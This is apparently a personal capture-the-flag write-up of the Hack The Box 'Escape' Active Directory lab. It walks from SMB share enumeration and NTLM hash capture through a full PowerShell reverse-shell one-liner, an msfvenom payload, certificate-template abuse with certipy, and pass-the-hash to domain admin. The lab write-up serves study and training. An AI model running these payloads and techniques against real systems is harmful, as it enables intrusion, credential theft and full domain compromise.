---
Category: OSCP - TjNull
LAB: https://app.hackthebox.com/machines/Escape?sort_by=created_at&sort_type=desc
Difficulty: Medium
Featured: yes
aliases:
  - Windows
  - AD
---

---
# Information / Description

![](../../0.%20Assets/Escape-1788696988685.webp)

---

# Walkthrough


We will start with the basics, let's do an `nmap` scan to see what this machine has to offer.

First let's find the ports

```
nmap -sS -p- $T --min-rate 5000 -oG openPorts
```

- `$T` is a variable i created to store the IP of the target machine

We are  storing it in a `grepable` format because i have a little functionality called `"ExtractPorts"` in my `zsh` that takes a file and with grep copies the open ports to the clipboard do we don't have to write them manually and/or scan for all ports again

![](../../0.%20Assets/Escape-1788697224241.webp)


Here you can find the dotfiles for kali I created -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)

now we can go a bit deeper into each port this is the `nmap` command I used

```
nmap -sS -p 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49689,49690,49710,49715 --min-rate 5000 -Pn -n -sVC -oN results.txt -v $T
```

And these are the results

```

┌─[bl1nk㉿kali]─[~/engagements/escape]─[󰦝 10.10.15.150]─[ 10.129.228.253]
└─❯ cat nmap/results.txt
─────┬─────────────────────────────────────────────────────────────────────────────
     │ File: nmap/results.txt
─────┼─────────────────────────────────────────────────────────────────────────────
   1 │ # Nmap 7.99 scan initiated Sat Sep  5 22:58:32 2026 as: /usr/lib/nmap/nmap --privileged -sS -p 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49689,49690,49710,49715 --min-rate 5000 -Pn -n -sVC -oN results.txt -v 10.129.228.253
   2 │ Nmap scan report for 10.129.228.253
   3 │ Host is up (0.031s latency).
   4 │
   5 │ PORT      STATE SERVICE       VERSION
   6 │ 53/tcp    open  domain        Simple DNS Plus
   7 │ 88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-06 04:58:38Z)
   8 │ 135/tcp   open  msrpc         Microsoft Windows RPC
   9 │ 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
  10 │ 389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
  11 │ | ssl-cert: Subject:
  12 │ | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
  13 │ | Issuer: commonName=sequel-DC-CA
  14 │ | Public Key type: rsa
  15 │ | Public Key bits: 2048
  16 │ | Signature Algorithm: sha256WithRSAEncryption
  17 │ | Not valid before: 2024-01-18T23:03:57
  18 │ | Not valid after:  2074-01-05T23:03:57
  19 │ | MD5:     ee4c c647 ebb2 c23e f472 1d70 2880 9d82
  20 │ | SHA-1:   d88d 12ae 8a50 fcf1 2242 909e 3dd7 5cff 92d1 a480
  21 │ |_SHA-256: 9b16 318b 7bc0 f508 b5cd 98a5 3a80 d1d7 54e1 e158 45b1 4956 003b 4bb5 05f8 7f98
  22 │ |_ssl-date: 2026-09-06T05:00:08+00:00; +8h00m00s from scanner time.
  23 │ 445/tcp   open  microsoft-ds?
  24 │ 464/tcp   open  kpasswd5?
  25 │ 593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
  26 │ 636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
  27 │ |_ssl-date: 2026-09-06T05:00:07+00:00; +7h59m59s from scanner time.
  28 │ | ssl-cert: Subject:
  29 │ | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
  30 │ | Issuer: commonName=sequel-DC-CA
  31 │ | Public Key type: rsa
  32 │ | Public Key bits: 2048
  33 │ | Signature Algorithm: sha256WithRSAEncryption
  34 │ | Not valid before: 2024-01-18T23:03:57
  35 │ | Not valid after:  2074-01-05T23:03:57
  36 │ | MD5:     ee4c c647 ebb2 c23e f472 1d70 2880 9d82
  37 │ | SHA-1:   d88d 12ae 8a50 fcf1 2242 909e 3dd7 5cff 92d1 a480
  38 │ |_SHA-256: 9b16 318b 7bc0 f508 b5cd 98a5 3a80 d1d7 54e1 e158 45b1 4956 003b 4bb5 05f8 7f98
  39 │ 1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
  40 │ | ms-sql-info:
  41 │ |   10.129.228.253:1433:
  42 │ |     Version:
  43 │ |       name: Microsoft SQL Server 2019 RTM
  44 │ |       number: 15.00.2000.00
  45 │ |       Product: Microsoft SQL Server 2019
  46 │ |       Service pack level: RTM
  47 │ |       Post-SP patches applied: false
  48 │ |_    TCP port: 1433
  49 │ | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
  50 │ | Issuer: commonName=SSL_Self_Signed_Fallback
  51 │ | Public Key type: rsa
  52 │ | Public Key bits: 2048
  53 │ | Signature Algorithm: sha256WithRSAEncryption
  54 │ | Not valid before: 2026-09-06T04:54:52
  55 │ | Not valid after:  2056-09-06T04:54:52
  56 │ | MD5:     663d 330a 041e 9c9a ded0 2bf7 ce65 3f58
  57 │ | SHA-1:   ca67 68d9 5fb6 0fd1 3fee 50b9 1d3e e137 fddf a04e
  58 │ |_SHA-256: d67f 9788 9095 2b95 bffd 65e2 bf50 efee f263 b1b2 ad06 27b3 b85f 282f 2b4a 28ae
  59 │ |_ssl-date: 2026-09-06T05:00:08+00:00; +8h00m00s from scanner time.
  60 │ | ms-sql-ntlm-info:
  61 │ |   10.129.228.253:1433:
  62 │ |     Target_Name: sequel
  63 │ |     NetBIOS_Domain_Name: sequel
  64 │ |     NetBIOS_Computer_Name: DC
  65 │ |     DNS_Domain_Name: sequel.htb
  66 │ |     DNS_Computer_Name: dc.sequel.htb
  67 │ |     DNS_Tree_Name: sequel.htb
  68 │ |_    Product_Version: 10.0.17763
  69 │ 3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
  70 │ |_ssl-date: 2026-09-06T05:00:08+00:00; +8h00m00s from scanner time.
  71 │ | ssl-cert: Subject:
  72 │ | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
  73 │ | Issuer: commonName=sequel-DC-CA
  74 │ | Public Key type: rsa
  75 │ | Public Key bits: 2048
  76 │ | Signature Algorithm: sha256WithRSAEncryption
  77 │ | Not valid before: 2024-01-18T23:03:57
  78 │ | Not valid after:  2074-01-05T23:03:57
  79 │ | MD5:     ee4c c647 ebb2 c23e f472 1d70 2880 9d82
  80 │ | SHA-1:   d88d 12ae 8a50 fcf1 2242 909e 3dd7 5cff 92d1 a480
  81 │ |_SHA-256: 9b16 318b 7bc0 f508 b5cd 98a5 3a80 d1d7 54e1 e158 45b1 4956 003b 4bb5 05f8 7f98
  82 │ 3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
  83 │ |_ssl-date: 2026-09-06T05:00:07+00:00; +7h59m59s from scanner time.
  84 │ | ssl-cert: Subject:
  85 │ | Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
  86 │ | Issuer: commonName=sequel-DC-CA
  87 │ | Public Key type: rsa
  88 │ | Public Key bits: 2048
  89 │ | Signature Algorithm: sha256WithRSAEncryption
  90 │ | Not valid before: 2024-01-18T23:03:57
  91 │ | Not valid after:  2074-01-05T23:03:57
  92 │ | MD5:     ee4c c647 ebb2 c23e f472 1d70 2880 9d82
  93 │ | SHA-1:   d88d 12ae 8a50 fcf1 2242 909e 3dd7 5cff 92d1 a480
  94 │ |_SHA-256: 9b16 318b 7bc0 f508 b5cd 98a5 3a80 d1d7 54e1 e158 45b1 4956 003b 4bb5 05f8 7f98
  95 │ 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  96 │ |_http-title: Not Found
  97 │ |_http-server-header: Microsoft-HTTPAPI/2.0
  98 │ 9389/tcp  open  mc-nmf        .NET Message Framing
  99 │ 49667/tcp open  msrpc         Microsoft Windows RPC
 100 │ 49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
 101 │ 49690/tcp open  msrpc         Microsoft Windows RPC
 102 │ 49710/tcp open  msrpc         Microsoft Windows RPC
 103 │ 49715/tcp open  msrpc         Microsoft Windows RPC
 104 │ Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
 105 │
 106 │ Host script results:
 107 │ | smb2-security-mode:
 108 │ |   3.1.1:
 109 │ |_    Message signing enabled and required
 110 │ | smb2-time:
 111 │ |   date: 2026-09-06T04:59:27
 112 │ |_  start_date: N/A
 113 │ |_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m58s
 114 │
 115 │ Read data files from: /usr/share/nmap
 116 │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 117 │ # Nmap done at Sat Sep  5 23:00:08 2026 -- 1 IP address (1 host up) scanned in 95.88 seconds
─────┴─────────────────────────────────────────────────────────────────────────────
```

We see `kerberos` and other `AD` related ports so it's quite safe to assume this is an `Active directory` 

Let's start by enumerating shares

After some trial and error I found that the user `guest` does not only exist in the domain but also has read permissions in the shares:

```
┌─[bl1nk㉿kali]─[~/engagements/escape]─[󰦝 10.10.15.150]─[ 10.129.228.253]
└─❯ netexec smb $T -u 'guest' -p '' --shares
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.253  445    DC               [+] sequel.htb\guest:
SMB         10.129.228.253  445    DC               [*] Enumerated shares
SMB         10.129.228.253  445    DC               Share           Permissions     Remark
SMB         10.129.228.253  445    DC               -----           -----------     ------
SMB         10.129.228.253  445    DC               ADMIN$                          Remote Admin
SMB         10.129.228.253  445    DC               C$                              Default share
SMB         10.129.228.253  445    DC               IPC$            READ            Remote IPC
SMB         10.129.228.253  445    DC               NETLOGON                        Logon server share
SMB         10.129.228.253  445    DC               Public          READ
SMB         10.129.228.253  445    DC               SYSVOL                          Logon server share
```

And inside the `Public` folder we can find an interesting PDF 

![](../../0.%20Assets/Escape-1788697999913.webp)

We will get it with

```
get "SQL Server Procedures.pdf"
```

And Inside we can find this 

![](../../0.%20Assets/Escape-1788698054399.webp)


| User       | Password            |
| ---------- | ------------------- |
| PublicUser | GuestUserCantWrite1 |

So we have credentials for a `mssql` service which we happen to see on the output of `nmap`, so we connect.

![](../../0.%20Assets/Escape-1788705588560.webp)


One thing we can do in `mssql` is to try to pass commands to the server through the settings

![|1067x443](../../0.%20Assets/Escape-1788705671891.webp)

So let's try

```
EXEC sp_configure 'show advanced options', '1'
```

We are not allowed to do this operation, so let's try something different

```
SQL (PublicUser  guest@master)> EXEC sp_configure 'show advanced options', '1'
ERROR(DC\SQLMOCK): Line 105: User does not have permission to perform this action.
```

Let's try exploiting `xp_dirtree` to steal an `NTLMv2 hash` we will do this with `responder`

We will start `responder` to capture the hash

```
sudo responder -I tun0
```

and in `mssql client` we will try to traverse with `xp_dirtree` to start a connection towards our kali and steal the hash with `responder`

```
xp_dirtreee \\10.10.15.150\somepath
```

![](../../0.%20Assets/Escape-1788706356546.webp)

And now we can try cracking this hash with hashcat

```
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-10.129.228.253.txt /usr/share/wordlists/rockyou.txt
```

- mode for `NTLMv2` = 5600

![](../../0.%20Assets/Escape-1788706511235.webp)

The cracked hash equals to `REGGIE1234ronnie`

| User    | Password         |
| ------- | ---------------- |
| sql_svc | REGGIE1234ronnie |

Let's see where this credentials are valid with `netexec`

we found that we are allowed to use `winrm` with the credentials we found so let's use `evil-winrm`

```
netexec winrm $T -u 'SQL_SVC' -p 'REGGIE1234ronnie'                                                                                             󰅗 2
WINRM       10.129.228.253  5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
WINRM       10.129.228.253  5985   DC               [+] sequel.htb\SQL_SVC:REGGIE1234ronnie (Pwn3d!)
```

- It says pwn3d

This is the command  we will use to connect to `winrm` and we will do it by using `evil-winrm`

```
sudo evil-winrm -i $T -u sql_svc -p 'REGGIE1234ronnie'
```

Once we connect through `winrm` we can send ourselves a reverse shell

start a listener with `nc`

```
nc -nlvp 1337
```

and from the `powershell` connection we have from `winrm` generate a payload like so

https://www.revshells.com/

```
$LHOST = "10.10.15.150"; $LPORT = 1337; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

![](../../0.%20Assets/Escape-1788708236609.webp)

I couldnt stabilaze the reverse shell so i created a reverse shell payload with msfvenom and runed it from the first reverse shell we had and it worked

```
sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.150 LPORT=1234 -f exe > reverse .exe
```

![](../../0.%20Assets/Escape-1788709755924.webp)

We will start a new listener, listening on the port of the payload, and this time with `rlwrap` to stabilize the `reverse shell`

```
rlwrap nc -lvpn 1234
```

Once we have this running we run the `.exe` we created with `msfvenom` in the client (I forgot to say we sent it to the client first, I did this with the python module `http.server` and i downloaded the content with `iwr` in powershell)

![](../../0.%20Assets/Escape-1788709764298.webp)


I tried looking for the user flag and I found  in the `C:\` drive A folder called SQLServer where if you go into the Logs you can find this:

![](../../0.%20Assets/Escape-1788717830784.webp)

Let's try the credentials with `netexec` in different services

```
netexec winrm $T -u Ryan.Cooper -p NuclearMosquito3
```

![](../../0.%20Assets/Escape-1788722656515.webp)

Bingo!
so let's connect with `evil-winrm`

```
evil-winrm -i $T -u "ryan.cooper" -p "NuclearMosquito3"
```

![](../../0.%20Assets/Escape-1788722395731.webp)

And in the desktop we have the user flag

![](../../0.%20Assets/Escape-1788722449499.webp)

After doing quite some enumeration for privilege escalation, I couldn't find much so I tried with `certpy` ->  [certipy-exploitation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)

```
certipy-ad find -u ryan.cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip 10.129.228.253 -stdout -vulnerable
```

Because "Enrollee Supplies Subject" lets you set the **Subject Alternative Name**, you request a cert on that template and put **`administrator`** in the SAN. The CA happily signs it. That cert now says _you are Administrator_  and AD CS will authenticate it as such/

![](../../0.%20Assets/Escape-1788724398286.webp)

Cool, now we can request the certificate as if we where the administrator

```
certipy-ad req -u ryan.cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip 10.129.228.253 -ca 'sequel-DC-CA' -template 'UserAuthentication' -upn administrator@sequel.htb
```

This writes `administrator.pfx`.

![](../../0.%20Assets/Escape-1788725186187.webp)

Authenticate with the cert to recover the target's NT hash **and** a Kerberos TGT:

```
certipy-ad auth -pfx administrator.pfx -dc-ip $T
```

In my case there was a SKEW in time to big so i used this command

```
sudo ntpdate 10.129.228.253
```

![](../../0.%20Assets/Escape-1788725714047.webp)

![](../../0.%20Assets/Escape-1788725833474.webp)

```
Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```

And then we will connect doing a `pass the hash` through `smb`

```
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee administrator@$T
```

![](../../0.%20Assets/Escape-1788727010478.webp)

And here is the flag

![](../../0.%20Assets/Escape-1788727057368.webp)